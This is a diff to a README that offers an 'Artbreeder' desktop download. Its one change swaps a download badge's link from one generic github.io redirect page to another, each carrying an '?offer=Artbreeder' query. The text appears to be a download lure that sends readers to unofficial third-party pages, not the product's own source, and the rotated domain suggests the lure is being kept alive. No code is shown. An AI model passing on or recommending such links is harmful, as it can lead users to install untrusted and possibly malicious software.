@@ -1,6 +1,6 @@
 # Artbreeder Download — Desktop AI Art Creator
 
-[![Get Artbreeder GitHub](https://img.shields.io/badge/Get%20Artbreeder%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://tools-git-app.github.io/.github/?offer=Artbreeder)
+[![Get Artbreeder GitHub](https://img.shields.io/badge/Get%20Artbreeder%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://app-hub-load.github.io/.github/?offer=Artbreeder)
 
 ---
 
